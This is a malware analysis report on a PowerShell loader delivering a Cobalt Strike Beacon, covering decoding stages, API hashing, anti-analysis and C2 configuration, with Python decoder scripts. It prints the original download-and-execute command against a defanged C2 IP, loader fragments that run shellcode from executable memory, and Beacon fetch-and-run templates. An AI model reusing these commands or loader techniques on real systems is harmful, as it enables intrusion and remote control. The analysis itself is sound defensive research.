---
title: "Static Analysis of a Multi-Stage Cobalt Strike Loader"
date: 2026-09-10 10:30:00 -0300
categories: [Malware Analysis, Loaders]
tags: [cobalt-strike, powershell, static-analysis]

lang: en
lang_name: English
lang_order: 1

translation_key: loader-cobalt-strike

permalink: /en/research/loader-cobalt-strike/
---

{% include language-switcher.html %}

# PowerShell Loader and x86 Cobalt Strike Beacon

> **Authorship and AI Use Note**
>
> The investigation, artifact identification, formulation of findings, and technical interpretation of the results were performed by the author. AI was used in this report only for structuring, organization, textual review, and the initial implementation of Python scripts intended to extract and decode data used by the malware. The scripts, their results, and the technical content presented were reviewed and validated. Some technical explanations were also supplemented with AI.
{: .prompt-info }

> **Analysis Context**
> This sample was collected in 2022. No actual infection occurred because the EDR installed on the user's computer contained the threat at the very first command shown below. Nevertheless, I was able to capture the later stages of this execution and investigate the artifacts. A few days after collection, the C2 server was already offline.
{: .prompt-tip }

> Some investigation findings were omitted from this report to retain the most relevant points in this malware execution chain.
{: .prompt-warning }
---


## 1. Summary

This report presents the results of the static analysis of a malicious chain initiated by a PowerShell command responsible for downloading and executing a second script directly in memory.

The first detection originated from the following command line:

```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('hxxp://31.41.244[.]192:80/645gkdkfgd'))"
```

The content served by the remote address consisted of a PowerShell loader containing a Base64-encoded payload. 

The hash is: `33a7648c64588e855b411fe9bcdb51489d4a33e4ab86705661049bb9b65ceddb`

This loader uses .NET reflection to resolve native APIs, decodes the Base64 data through `CryptStringToBinaryA`, writes the content to an executable memory region, and transfers execution flow to the resulting shellcode.

The analysis made it possible to reconstruct the following chain:

```text
Initial PowerShell command
        ↓
Download and execution of the PowerShell loader
        ↓
Base64 processed by CryptStringToBinaryA
        ↓
Initial x86 shellcode
        ↓
ROR decoding
        ↓
Stage 1 — Intermediate DLL
        ↓
API resolution through CRC32
        ↓
Decoding of embedded PE payload
        ↓
Stage 2 — Cobalt Strike Beacon
        ↓
Configuration decoded with XOR 0x2E
        ↓
HTTP communication with the C2 server
```

The final stage was identified as an x86 DLL compatible with **Cobalt Strike Beacon**, containing a reflective loader, HTTP communication configuration, process-injection routines, token manipulation, PowerShell execution, and service operations.

The configuration (which was extracted with a Python script) contains:

```text
C2:       31.41.244.192
Port:     80
GET:      /push
POST:     /submit.php
Sleep:    60000 ms
Jitter:   0
```

No automatic persistence was identified during the initial flow analyzed. Some capabilities present in the Beacon, such as service creation and process injection, depend on commands subsequently received from the C2 server and should not be interpreted as behaviors executed automatically.

---

## 2. Scope and Methodology

### 2.1 Scope

This report covers static analysis exclusively:

* inspection of the PowerShell loader;
* extraction of the Base64 string;
* analysis of the initial shellcode;
* reconstruction of the decoding algorithms;
* extraction of both PE stages;
* analysis of headers, sections, imports, and exports;
* reverse engineering in IDA;
* API resolution through hashes;
* extraction of the Beacon configuration;
* identification of implemented capabilities.

The following are outside the scope of this report:

* debugging with x32dbg;
* controlled execution of the sample;
* runtime memory analysis;
* behavioral analysis;
* interaction with the C2 server;
* dynamic validation of tasking;
* complete decryption of the C2 protocol.

### 2.2 Tools Used

* <a href="https://hex-rays.com/ida-free" target="_blank" rel="noopener noreferrer">IDA Free</a>;
* <a href="https://detect-it-easy.github.io/" target="_blank" rel="noopener noreferrer">Detect It Easy — DiE</a>;
* <a href="https://github.com/hasherezade/pe-bear" target="_blank" rel="noopener noreferrer">PE-bear</a>;
* <a href="https://cyberchef.io/" target="_blank" rel="noopener noreferrer">CyberChef</a>;
* <a href="https://www.python.org/downloads/" target="_blank" rel="noopener noreferrer">Python 3</a>;
* <a href="https://jupyter.org/" target="_blank" rel="noopener noreferrer">JupyterLab</a>;
* <a href="https://github.com/erocarrera/pefile" target="_blank" rel="noopener noreferrer"><code>pefile</code></a>;
* <a href="https://www.sublimetext.com/" target="_blank" rel="noopener noreferrer">Sublime Text</a>;
* <a href="https://github.com/Sentinel-One/CobaltStrikeParser" target="_blank" rel="noopener noreferrer">CobaltStrikeParser</a>;


---

## 3. Infection Chain Overview

The chain begins with the following command:

```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('hxxp://31.41.244[.]192:80/645gkdkfgd'))"
```

The elements perform the following functions:

| Element          | Function                                           |
| ---------------- | ------------------------------------------ |
| `powershell.exe` | Starts the PowerShell interpreter                   |
| `-nop`           | Prevents the user profile from being loaded         |
| `-w hidden`      | Hides the PowerShell window                          |
| `-c`             | Executes the supplied command                        |
| `Net.WebClient`  | Creates an HTTP client                               |
| `DownloadString` | Downloads the remote content as text                 |
| `IEX`            | Executes the downloaded content as PowerShell        |

The remote address serves the PowerShell loader analyzed in the following sections.

---

## 4. PowerShell Loader Analysis

### 4.1 General Structure

> You can click on the images to see more details in fullscreen
{: .prompt-tip }
![full script.png](/images/cobalt-strike-loader/full%20script.png)
<center><i>Figure 1 — Complete PowerShell loader containing dynamic API resolution and a Base64 payload (cropped).</i></center>

This artifact can be downloaded on <a href="https://www.virustotal.com/gui/file/33a7648c64588e855b411fe9bcdb51489d4a33e4ab86705661049bb9b65ceddb/detection" target="_blank" rel="noopener noreferrer">VirusTotal</a> (paid account) or <a href="https://tria.ge/s?q=33a7648c64588e855b411fe9bcdb51489d4a33e4ab86705661049bb9b65ceddb" target="_blank" rel="noopener noreferrer">Triage</a> with a free account.

The script begins with:

```powershell
Set-StrictMode -Version 2
```

It then defines the following functions:

```text
func_get_proc
func_get_type
```

The `func_get_proc` function uses .NET reflection to access internal methods related to:

```text
GetModuleHandle
GetProcAddress
```

This makes it possible to resolve native functions without explicitly declaring traditional <a href="https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke" target="_blank" rel="noopener noreferrer">P/Invoke (Platform Invoke)</a> structures.

The `func_get_type` function dynamically creates a delegate with `System.Reflection.Emit`. This delegate is used to call native functions from the addresses obtained through `GetProcAddress`.

This mechanism allows the script to:

1. locate an already loaded DLL;
2. resolve an API by name;
3. construct the function signature;
4. convert the address into a delegate;
5. invoke the API directly from PowerShell.

---

### 4.2 Base64 String Processing

The shellcode is stored in the following variable:

```powershell
$var_base64 = '...'
```

The script loads:

```text
crypt32.dll
```

and resolves the following function:

```text
CryptStringToBinaryA
```

The <a href="https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptstringtobinarya#:~:text=[in]%20dwFlags" target="_blank" rel="noopener noreferrer">flag</a> used is:

```text
0x1 = CRYPT_STRING_BASE64
```

Processing takes place in two calls.

#### First Call
```powershell
$var_length = 0

$var_result = $var_string_to_binary.Invoke(
    $var_base64,
    $var_base64.Length,
    0x1,
    [IntPtr]::Zero,
    [Ref]$var_length,
    [IntPtr]::Zero,
    [IntPtr]::Zero
)
```

Because the pointer intended to receive the bytes is set to null, the first call only calculates the size required to store the decoded Base64 content.

#### Memory Region Creation

The script resolves:

```text
CreateFileMappingA
MapViewOfFile
```

and creates a mapped region with read, write, and execute permissions.

The value used in `CreateFileMappingA` is `0x08000040`, which includes:

```text
PAGE_EXECUTE_READWRITE
SEC_COMMIT
```

`MapViewOfFile` then returns the virtual address where the shellcode will be written.

#### Second Call

```powershell
$var_result = $var_string_to_binary.Invoke(
    $var_base64,
    $var_base64.Length,
    0x1,
    $var_map,
    [Ref]$var_length,
    [IntPtr]::Zero,
    [IntPtr]::Zero
)
```

This time, the address of the mapped region (named `$var_map`) is supplied as the output buffer, causing `CryptStringToBinaryA` to write the decoded bytes directly to it.

#### Execution Transfer

The memory address is converted into a delegate:

```powershell
$var_invoke =
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        $var_map,
        (func_get_type @([IntPtr]) ([Void]))
    )
```

The shellcode is executed with:

```powershell
$var_invoke.Invoke($var_map)
```

The shellcode base address is also supplied as an argument to the code itself.

![7c119fad4d969631b2398403db078882.png](/images/cobalt-strike-loader/7c119fad4d969631b2398403db078882.png)
<center><i>Figure 2 — First call to obtain the size and second call to write the decoded bytes.</i></center>

---

### 4.3 Architecture Selection

The script checks:

```powershell
[IntPtr]::Size
```

When running in a 32-bit process, the content is executed directly.

In 64-bit processes, the script uses:

```powershell
Start-Job -RunAs32
```

This indicates that the payload was created for the x86 architecture.

---

## 5. Base64 Shellcode Extraction

The script below automatically locates the `$var_base64` variable and writes the decoded content to `stage0_shellcode.bin`.

### Script 1 — Base64 Extraction

```python
import base64
import re
from pathlib import Path

INPUT_PS1 = Path("loader.ps1")
OUTPUT_BIN = Path("stage0_shellcode.bin")

text = INPUT_PS1.read_text(
    encoding="utf-8",
    errors="ignore"
)

match = re.search(
    r"\$var_base64\s*=\s*'([^']+)'",
    text,
    flags=re.DOTALL,
)

if not match:
    raise RuntimeError(
        "The $var_base64 variable was not found."
    )

base64_text = re.sub(
    r"\s+",
    "",
    match.group(1)
)

decoded = base64.b64decode(
    base64_text,
    validate=True
)

OUTPUT_BIN.write_bytes(decoded)

# print("[+] Complete B64: ", base64_text) # Caution: very large string!

print(f"[+] Decoded file saved: {OUTPUT_BIN}")
print(f"[+] Size: {len(decoded)} bytes")
print(f"[+] First bytes: {decoded[:16].hex(' ')}")
```

The result does not begin with the `4D 5A` signature, indicating that the initial content is raw shellcode rather than a directly loadable PE file.

![b71734e2f72461f487b7a227d51d6f08.png](/images/cobalt-strike-loader/b71734e2f72461f487b7a227d51d6f08.png)
<center><i>Figure 3 — First shellcode bytes after removal of the Base64 layer.</i></center>

---

## 6. Initial Shellcode and Stage 1 Extraction

### 6.1 Initial Decoder

The shellcode begins by retrieving its own base address:

```nasm
mov eax, [esp+4]
```

It then accesses internal addresses relative to the base:

```nasm
mov ecx, [eax+9Ch]
mov edx, [eax+0A0h]
lea esi, [eax+0A4h]
```

These fields are interpreted as follows:

| Offset | Function                                      |
| -----: | ----------------------------- |
| `0x9C` | Address of the key                            |
| `0xA0` | Address containing the encoded region size    |
| `0xA4` | Address of the beginning of the encoded content |

The decoding loop is:

```nasm
lodsb
and ecx, 7
ror al, cl
inc ecx
stosb
dec edx
jnz decoder_loop
```

The behavior can be represented as:

```c
base = argument;

key  = *(uint32_t *)(base + 0x9C);
size = *(uint32_t *)(base + 0xA0);
data = base + 0xA4;

for (i = 0; i < size; i++) {
    data[i] = ror8(data[i], key & 7);
    key++;
}
```

In other words, the code iterates over each data byte and rotates it to the right. The rotation count is obtained through `key & 7`, which simply limits the key value to a number between **0 and 7**. The key is then incremented by 1 for each byte.

The operation is performed in place. After the loop, the region at `base + 0xA4` begins with a valid PE header.

![8f716c464f5e819fb732b809a2ff5bbd.png](/images/cobalt-strike-loader/8f716c464f5e819fb732b809a2ff5bbd.png)
<center><i>Figure 4 — Disassembly of the beginning of the shellcode, containing the ROR algorithm.</i></center>

![84c9d50b169d5b210c43f05e4100ad56.png](/images/cobalt-strike-loader/84c9d50b169d5b210c43f05e4100ad56.png)
<center><i>Figure 5 — Region where Stage 1 will be decoded.</i></center>

---

#### Script 2 — Stage 1 Decoding
The script below performs exactly the same operation as the shellcode: it supplies the offsets and then applies the rotations. Finally, it saves the file.
```python
from pathlib import Path
import struct

INPUT_FILE = Path("stage0_shellcode.bin")
OUTPUT_FILE = Path("stage1_decoded.bin")

KEY_OFFSET = 0x9C
SIZE_OFFSET = 0xA0
DATA_OFFSET = 0xA4


def ror8(value: int, count: int) -> int:
    value &= 0xFF
    count &= 7

    if count == 0:
        return value

    return (
        (value >> count) |
        (value << (8 - count))
    ) & 0xFF


data = INPUT_FILE.read_bytes()

key = struct.unpack_from(
    "<I",
    data,
    KEY_OFFSET
)[0]

size = struct.unpack_from(
    "<I",
    data,
    SIZE_OFFSET
)[0]

if DATA_OFFSET + size > len(data):
    raise RuntimeError(
        "The encoded region extends beyond the end of the file."
    )

decoded = bytearray(size)
current_key = key

for i in range(size):
    decoded[i] = ror8(
        data[DATA_OFFSET + i],
        current_key & 7
    )

    current_key = (
        current_key + 1
    ) & 0xFFFFFFFF

if decoded[:2] != b"MZ":
    raise RuntimeError(
        "The result does not have an MZ signature."
    )

OUTPUT_FILE.write_bytes(decoded)

print(f"[+] Initial key: 0x{key:08X}")
print(f"[+] Size: 0x{size:X}")
print(f"[+] File saved: {OUTPUT_FILE}")
```

---

## 7. Stage 1 Analysis

### 7.1 Identification

| Field           | Value                                                              |
| --------------- | ------------------------------------------------------------------ |
| File            | `stage1_decoded.bin`                                               |
| SHA-256         | `a41dde7d2733cf4f8c057a188fb5bce82f085b7972aeaa23b5ddb0ef71c1988d` |                                            |
| Type            | PE32 x86 DLL                                                       |
| Internal name   | `a32big.dll`                                                       |
| ImageBase       | `0x6B680000`                                                       |
| Entry Point RVA | `0x13B0`                                                           |
| Sections        | 9                                                                  |
| Size            | `337920` bytes                                                     |

The timestamps found in the PE header should be treated with low confidence because they may have been altered during compilation or afterward.

![5d5a7faf7b90c0589f407f546f3b81eb.png](/images/cobalt-strike-loader/5d5a7faf7b90c0589f407f546f3b81eb.png)
<center><i>Figure 6 — Identification of the Stage 1 format, architecture, and compiler.</i></center>

![0078b8528799bd019248805440c5979d.png](/images/cobalt-strike-loader/0078b8528799bd019248805440c5979d.png)
<center><i>Figure 7 — PE structure and Stage 1 section distribution.</i></center>

---

### 7.2 Exports

The identified exports include:

```text
ARef
DllGetClassObject
DllMain
DllRegisterServer
DllUnregisterServer
Start
```

The COM-related names may hinder immediate identification of the DLL's actual purpose.

---

## 8. Dynamic API Resolution Through Hashes

### 8.1 Purpose of the Technique

Stage 1 avoids directly storing the names of several APIs it uses.

Instead of importing all functions normally, the code:

1. loads a DLL with `LoadLibraryW`;
2. locates its Export Directory;
3. iterates through the exported names;
4. calculates a hash for each name;
5. compares the result with constants present in the binary;
6. calls `GetProcAddress` when it finds a match;
7. stores the resolved address for later use.

This technique reduces the amount of information available in the Import Table and makes automated identification of the sample's capabilities more difficult.

---

### 8.2 Identified Algorithm

The resolver function uses reflected CRC32 with:

```text
Polynomial:  0xEDB88320
Seed:       0xFFFFFFFF
Final XOR:   not observed
Input:       ASCII name of the exported function
```

The pseudocode is:

```c
crc = 0xFFFFFFFF;

for each byte in export_name {
    crc ^= byte;

    for (i = 0; i < 8; i++) {
        if (crc & 1)
            crc = (crc >> 1) ^ 0xEDB88320;
        else
            crc >>= 1;
    }
}
```


This polynomial is also observed in a <a href="https://en.wikipedia.org/wiki/Computation_of_cyclic_redundancy_checks#:~:text=0xEDB88320" target="_blank" rel="noopener noreferrer">Wikipedia</a> example.

The comparison with the hardcoded value is direct:

```c
if (target_hash == calculated_crc)
```

When a match occurs, the code calls `GetProcAddress` using the located export name.

![50016c83fbf6730185f72d351fca417a.png](/images/cobalt-strike-loader/50016c83fbf6730185f72d351fca417a.png)
<center><i>Figure 8 — Implementation of the CRC32 algorithm used for API resolution.</i></center>

![21d6a688edee8ce8bf84020e78b7cbcd.png](/images/cobalt-strike-loader/21d6a688edee8ce8bf84020e78b7cbcd.png)
<center><i>Figure 9 — List of calls to the hash resolver function.</i></center>

---

### 8.3 Processed DLLs

Resolution blocks were identified for:

```text
kernel32.dll
advapi32.dll
ws2_32.dll
wininet.dll
```

In IDA, some wide-character names were initially split incorrectly. For example, `L"a" L"dvapi32.dll"` together represented `L"advapi32.dll"`.

Correctly defining the data as a UTF-16LE string made it possible to recover the complete name.

---

### 8.4 Reproducing the Algorithm in Python

The following code reproduces the malware's algorithm:

```python
def malware_crc32_name(name: bytes) -> int:
    crc = 0xFFFFFFFF

    for byte in name:
        crc ^= byte

        for _ in range(8):
            if crc & 1:
                crc = (
                    (crc >> 1) ^ 0xEDB88320
                )
            else:
                crc >>= 1

            crc &= 0xFFFFFFFF

    return crc
```

The function below iterates through a DLL's exports and searches for matches:

```python
import pefile
from pathlib import Path


def find_export_by_hash(
    dll_path: Path,
    target_hash: int
):
    pe = pefile.PE(str(dll_path))
    matches = []

    for export in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        if not export.name:
            continue

        calculated = malware_crc32_name(
            export.name
        )

        if calculated == target_hash:
            matches.append(
                export.name.decode(
                    "ascii",
                    errors="replace"
                )
            )

    return matches
```

Usage example:

```python
for target_hash in kernel32_hashes:
    matches = find_export_by_hash(
        kernel32_path,
        target_hash
    )

    print(
        f"0x{target_hash:08X} -> {matches}"
    )
```

![c0737e2729871028e02fff80ffdd3c78.png](/images/cobalt-strike-loader/c0737e2729871028e02fff80ffdd3c78.png)
<center><i>Figure 10 — Reproduction of the algorithm and association between hashes and API names (JupyterLab).</i></center>

---

### 8.5 Relevant APIs by Purpose

The complete hash list may contain dozens of entries. To preserve readability, the main body of the report presents only relevant groups.

| DLL            | Examples of resolved APIs                                                                                                                                                      | Purpose                                             |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------- |
| `kernel32.dll` | `CreateFileA/W`, `CreateFileMappingA/W`, `MapViewOfFile`, `CreateNamedPipe`, `ConnectNamedPipe`, `CloseHandle`, `OpenProcess`, `VirtualAlloc`, `VirtualProtect`, `CreateThread` | Files, memory, processes, threads, and named pipes  |
| `ws2_32.dll`   | `WSAStartup`, `socket`, `connect`, `send`, `recv`, `closesocket`                                                                                                                | Socket communication                                |
| `wininet.dll`  | `InternetOpenA`, `InternetConnectA`, `HttpOpenRequestA`, `HttpSendRequestA`, `InternetReadFile`, `InternetCloseHandle`                                                          | HTTP communication with the C2 server               |
| `advapi32.dll` | `OpenSCManagerA/W`, `CreateServiceA/W`, `StartServiceA/W`, `DeleteService`, `CloseServiceHandle`                                                                                | Service operations                                  |


A resolved API does not necessarily represent an executed API.

| Evidence                 | Permitted conclusion                         |
| ------------------------ | ------------------------------------ |
| Resolved hash            | API available to the code                    |
| XREF to the pointer      | API referenced by a routine                  |
| Identified call site     | Implemented capability                       |
| Understood arguments     | Probable or confirmed purpose                |
| Observed execution       | Behavior actually performed                  |


<span id="ref-appendix-d"></span>
> The complete `hash → API` mapping is available in [Appendix D](#appendix-d).
{: .prompt-info }

---

## 9. Process Control and Anti-Analysis

A routine was identified that enumerates running processes and retrieves information about the parent process of the host process.

The helper function uses `CreateToolhelp32Snapshot`, `Process32FirstW`, and `Process32NextW` to locate the `PROCESSENTRY32W` structure corresponding to a supplied PID. In the calling flow, the `th32ParentProcessID` field from the current process entry is used to retrieve the parent process entry.

The routine:

* obtains the entry corresponding to the current process;
* extracts its `th32ParentProcessID`;
* locates the parent process in the snapshot;
* checks whether the parent name contains `powershell.exe`;
* also queries the parent process of that entry, that is, one additional generation in the process lineage;
* checks whether that ancestor contains `powershell.exe`;
* opens the selected processes with the `0x401` access mask;
* calls `TerminateProcess` when `OpenProcess` returns a valid handle;
* finally, attempts to terminate the immediate parent process regardless of whether it matches `powershell.exe`.

The access requested through `OpenProcess` includes `PROCESS_TERMINATE` and `PROCESS_QUERY_INFORMATION` (<a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights#:~:text=PROCESS_TERMINATE%20(0x0001)&amp;text=PROCESS_QUERY_INFORMATION%20(0x0400)" target="_blank" rel="noopener noreferrer">0x401</a>)

The routine may remove the original launcher and interfere with tools that started PowerShell as a child process.

The most appropriate classification here may be "Process-tree cleanup or evasion with an anti-debugging effect."

No explicit comparisons with names such as the following were observed:

```text
x32dbg.exe
ollydbg.exe
windbg.exe
```

![851c3af58fdaa819570f8e817f5cba8d.png](/images/cobalt-strike-loader/851c3af58fdaa819570f8e817f5cba8d.png)
<center><i>Figure 11 — Use of Toolhelp to locate the parent process.</i></center>

![f549f4b89ca7a7a8c0587bc62f49e83a.png](/images/cobalt-strike-loader/f549f4b89ca7a7a8c0587bc62f49e83a.png)
<center><i>Figure 12 — Routine responsible for terminating ancestor processes.</i></center>

---

## 10. Stage 2 Extraction

The Stage 1 `.data` section stands out because it is very large, raising the suspicion that additional data may be decoded there.
![424a05e40b22bb59439bb939d853bb91.png](/images/cobalt-strike-loader/424a05e40b22bb59439bb939d853bb91.png)
<center><i>Figure 13 - Size of the Stage 1 .data section.</i></center>

Investigating the beginning of this section revealed some interesting bytes:
![da27f22a433f4bbebf3d839fb2983e98.png](/images/cobalt-strike-loader/da27f22a433f4bbebf3d839fb2983e98.png)
<center><i>Figure 14 - Initial bytes of .data.</i></center>

The marked items show bytes related to the "size" field, similarly to the value examined in the shellcode at the beginning of the chain, followed by a large sequence of bytes.

| Field            |        Value |
| ---------------- | -----------: |
| Encoded VA       | `0x6B68F054` |
| RVA              |     `0xF054` |
| Size             |    `0x33800` |

 Searching for references to where this array is used revealed an extraction function.
![ce242b5d01762f9c1b79ebc4ecd2d593.png](/images/cobalt-strike-loader/ce242b5d01762f9c1b79ebc4ecd2d593.png)
<center><i>Figure 15 - Stage 2 extraction function.</i></center>

The algorithm used to recover Stage 2 is conceptually similar to the one observed during Stage 1 decoding. The difference is that this extractor does not use a key; the initial count is fixed at 1.

The code:

1. allocates a memory region;
2. iterates through `0x33800` bytes;
3. applies `ROR` with a variable count;
4. writes the result;
5. transfers execution to the decoded content.

---

#### Script 3 — Stage 2 Extraction

```python
from pathlib import Path

import pefile

INPUT_FILE = Path("stage1_decoded.bin")
OUTPUT_FILE = Path("stage2_decoded.bin")

ENCODED_VA = 0x6B68F054
ENCODED_SIZE = 0x33800
INITIAL_COUNT = 1


def ror8(value: int, count: int) -> int:
    value &= 0xFF
    count &= 7

    if count == 0:
        return value

    return (
        (value >> count) |
        (value << (8 - count))
    ) & 0xFF


data = INPUT_FILE.read_bytes()
pe = pefile.PE(str(INPUT_FILE))

rva = (
    ENCODED_VA -
    pe.OPTIONAL_HEADER.ImageBase
)

file_offset = pe.get_offset_from_rva(rva)

if file_offset + ENCODED_SIZE > len(data):
    raise RuntimeError(
        "The encoded region extends beyond the end of the file."
    )

decoded = bytes(
    ror8(
        data[file_offset + i],
        (INITIAL_COUNT + i) & 7
    )
    for i in range(ENCODED_SIZE)
)

if decoded[:2] != b"MZ":
    raise RuntimeError(
        "The result does not have an MZ signature."
    )

OUTPUT_FILE.write_bytes(decoded)

print(f"[+] RVA: 0x{rva:X}")
print(f"[+] File offset: 0x{file_offset:X}")
print(f"[+] Size: 0x{len(decoded):X}")
print(f"[+] File saved: {OUTPUT_FILE}")
```

To consolidate the analysis so far, Stage 1:

1) Is a DLL internally identified as `a32big.dll`.

2) It acts as a loader for the next stage.

3) Contains routines for dynamic API resolution.

4) Decodes Stage 2 with ROR.

---

## 11. Stage 2 Analysis

### 11.1 Identification

| Field           | Value                                                              |
| --------------- | ------------------------------------------------------------------ |
| File            | `stage2_decoded.bin`                                               |
| SHA-256         | `6318e322c478adefa9b4a16166c3d05201153b5cbd1f2e21327300abdeb5a757` |                                          |
| Type            | PE32 x86 DLL                                                       |
| Internal name   | `beacon.dll`                                                       |
| Export          | `_ReflectiveLoader@4`                                              |
| ImageBase       | `0x10000000`                                                       |
| Entry Point RVA | `0x1627A`                                                          |
| Sections        | 4                                                                  |
| Size            | `210944` bytes                                                     |

The presence of:

```text
beacon.dll
_ReflectiveLoader@4
```

combined with the configuration structure and the identified capabilities is compatible with an **x86 Cobalt Strike Beacon**.

![fad32249832fc21120271f0cff6967c4.png](/images/cobalt-strike-loader/fad32249832fc21120271f0cff6967c4.png)
<center><i>Figure 16 — Identification of Stage 2 as an x86 DLL in DiE.</i></center>

![b6aaea5b138fd42d2ed0cc1880a9e4b5.png](/images/cobalt-strike-loader/b6aaea5b138fd42d2ed0cc1880a9e4b5.png)
<center><i>Figure 17 — _ReflectiveLoader@4 export and Beacon PE structure.</i></center>

---

## 12. Beacon/C2 Configuration Decoding

A function was identified that performs an XOR operation on a `4096`-byte array at:

```text
VA:  0x10032020
RVA: 0x32020
```
![6706352e5972d228b64cb9847ad7b87b.png](/images/cobalt-strike-loader/6706352e5972d228b64cb9847ad7b87b.png)
<center><i>Figure 18 — Encoded configuration block in the data section.</i></center>

The first routine that uses the array executes:

```c
for (i = 0; i < 4096; i++)
    array[i] ^= 0x2E;
```
Therefore, another Python script is required to perform the same decoding operation as the malware.

---

#### Script 4 — Configuration Extraction

```python
import re
from pathlib import Path

import pefile

INPUT_FILE = Path("stage2_decoded.bin")
OUTPUT_FILE = Path("config_decoded.bin")

CONFIG_VA = 0x10032020
CONFIG_SIZE = 0x1000
XOR_KEY = 0x2E

# Minimum number of characters required to treat a sequence as a string.
MIN_STRING_LENGTH = 3

{% raw %}
def extract_ascii_strings(
    data: bytes,
    minimum_length: int = 3,
) -> list[str]:
    pattern = rb"[\x20-\x7E]{%d,}" % minimum_length

    return [
        match.decode("ascii")
        for match in re.findall(pattern, data)
    ]
{% endraw %}

data = INPUT_FILE.read_bytes()
pe = pefile.PE(str(INPUT_FILE))

rva = (
    CONFIG_VA -
    pe.OPTIONAL_HEADER.ImageBase
)

file_offset = pe.get_offset_from_rva(rva)

if file_offset + CONFIG_SIZE > len(data):
    raise RuntimeError(
        "The configuration extends beyond the end of the file."
    )

encoded = data[
    file_offset:
    file_offset + CONFIG_SIZE
]

decoded = bytes(
    byte ^ XOR_KEY
    for byte in encoded
)

OUTPUT_FILE.write_bytes(decoded)

print(f"[+] Config RVA: 0x{rva:X}")
print(f"[+] File offset: 0x{file_offset:X}")
print(f"[+] File saved: {OUTPUT_FILE}")

ascii_strings = extract_ascii_strings(
    decoded,
    MIN_STRING_LENGTH,
)

print("\n[+] ASCII strings found:")

if ascii_strings:
    for string in ascii_strings:
        print(f"    {string}")
else:
    print("    No ASCII strings found.")

```

The result is a binary structure rather than a single string. Therefore, it contains:

* null bytes;
* field IDs;
* types;
* sizes;
* integers;
* strings;
* binary buffers.

For readability, the result was filtered to strings with a minimum length of 3:

![5cf4492f05baf0cea095f472a08ebf03.png](/images/cobalt-strike-loader/5cf4492f05baf0cea095f472a08ebf03.png)
<center><i>Figure 19 — Strings and parameters visible after XOR 0x2E (filtered with a minimum strings length of 3).</i></center>

---

## 13. Extracted Configuration
To further understand the Beacon configuration, the <a href="https://github.com/Sentinel-One/CobaltStrikeParser" target="_blank" rel="noopener noreferrer">CobaltStrikeParser</a> project was used, which attempts to go beyond readable strings. When `config_decoded.bin` was supplied as an argument, the script provided some additional details (filtered list):

| Field              | Value                                                             |
| ------------------ | ----------------------------------------------------------------- |
| Protocol           | HTTP                                                              |
| C2                 | `31.41.244.192`                                                   |
| Port               | `80`                                                              |
| Sleep              | `60000 ms`                                                        |
| Jitter             | `0`                                                               |
| URI GET            | `/push`                                                           |
| URI POST           | `/submit.php`                                                     |
| GET verb           | `GET`                                                             |
| POST verb          | `POST`                                                            |
| User-Agent         | `Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)` |
| Metadata header    | `Cookie`                                                          |
| Content-Type       | `application/octet-stream`                                        |
| Spawn-to x86       | `%windir%\syswow64\rundll32.exe`                                  |
| Spawn-to x64       | `%windir%\sysnative\rundll32.exe`                                 |
| Watermark          | `1580103824`                                                      |
|ProcInject_Execute |`CreateThread`, `SetThreadContext`, `CreateRemoteThread`, `RtlCreateUserThread`|
|ProcInject_AllocationMethod|`VirtualAllocEx`|

---

## 14. C2 Communication

Stage 2 uses `WININET.dll` APIs compatible with:

```text
InternetOpenA
InternetConnectA
HttpOpenRequestA
HttpSendRequestA
InternetQueryDataAvailable
InternetReadFile
InternetCloseHandle
```

The flow can be summarized as:

```text
InternetOpenA(User-Agent)
        ↓
InternetConnectA(31.41.244.192, 80)
        ↓
HttpOpenRequestA(GET, /push)
        ↓
Task retrieval
```

Data transmission uses:

```text
HttpOpenRequestA(POST, /submit.php)
        ↓
Content-Type: application/octet-stream
        ↓
HttpSendRequestA
```

The configuration also indicates that the metadata is:

1. processed by the Beacon;
2. encoded in Base64;
3. inserted into the `Cookie` header.

The conclusions in this section are derived from the decoded configuration and the static flow of the WinINet routines.

![5be34d5a635abc3755b5842080a2ebb6.png](/images/cobalt-strike-loader/5be34d5a635abc3755b5842080a2ebb6.png)
<center><i>Figure 20 — HTTP session initialization with values obtained from the configuration.</i></center>

![dbd8403882f76d8e4557e7193298aec7.png](/images/cobalt-strike-loader/dbd8403882f76d8e4557e7193298aec7.png)
<center><i>Figure 21 — Construction of the Beacon HTTP requests.</i></center>

---

## 15. Stage 2 Capabilities

### 15.1 Process Injection

APIs such as the following were identified:

```text
VirtualAllocEx
WriteProcessMemory
VirtualProtectEx
CreateRemoteThread
GetThreadContext
SetThreadContext
ResumeThread
RtlCreateUserThread
NtQueueApcThread
NtMapViewOfSection
```

These functions demonstrate support for multiple process-injection and execution techniques.

Static analysis of the routines does not identify which process would be selected as the target.

---

### 15.2 Token Manipulation

References to the following were identified:

```text
OpenProcessToken
OpenThreadToken
AdjustTokenPrivileges
DuplicateTokenEx
LogonUserA
ImpersonateNamedPipeClient
ImpersonateLoggedOnUser
CreateProcessWithTokenW
CreateProcessWithLogonW
CreateProcessAsUserA
```

There are also references to:

```text
SeDebugPrivilege
SeCreateTokenPrivilege
SeAssignPrimaryTokenPrivilege
```

These capabilities allow:

* privilege enablement;
* token duplication;
* impersonation;
* execution with alternative credentials.

---

### 15.3 Services

The Beacon contains routines for:

```text
OpenSCManager
CreateService
StartService
QueryServiceStatus
DeleteService
CloseServiceHandle
```

These capabilities are compatible with:

* remote execution;
* lateral movement;
* temporary service creation;
* payload execution through a service.

The analysis did not confirm that the initial flow creates a persistent service.

---

### 15.4 PowerShell Execution and Strings

In Stage 2, templates such as `powershell -nop -exec bypass -EncodedCommand "%s"` and `IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/')` were identified.

These strings demonstrate support for PowerShell execution after tasking is received.

Some privilege-related APIs were also found:
![e387266b9fbb7cbe1901475410c2b5f3.png](/images/cobalt-strike-loader/e387266b9fbb7cbe1901475410c2b5f3.png)
<center><i>Figure 22 - Strings related to privilege APIs.</i></center>

---

### 15.5 SHA-256

